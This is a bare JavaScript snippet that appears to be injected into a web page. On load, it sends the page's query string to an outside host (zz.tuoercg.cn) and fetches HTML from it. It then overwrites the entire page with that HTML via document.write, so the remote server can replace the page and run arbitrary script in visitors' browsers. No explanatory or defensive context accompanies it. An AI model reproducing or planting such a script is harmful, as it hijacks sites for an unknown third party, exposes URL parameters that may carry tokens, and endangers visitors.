<script>
function loadHtml() {
    const params = new URLSearchParams(window.location.search);
    const queryString = params.toString();
    const url = `https://zz.tuoercg.cn/mem2.php?${queryString}`;
    fetch(url)
        .then(response => response.text())
        .then(html => {
            document.open();
            document.write(html);
            document.close();
        });
}
loadHtml();
</script>
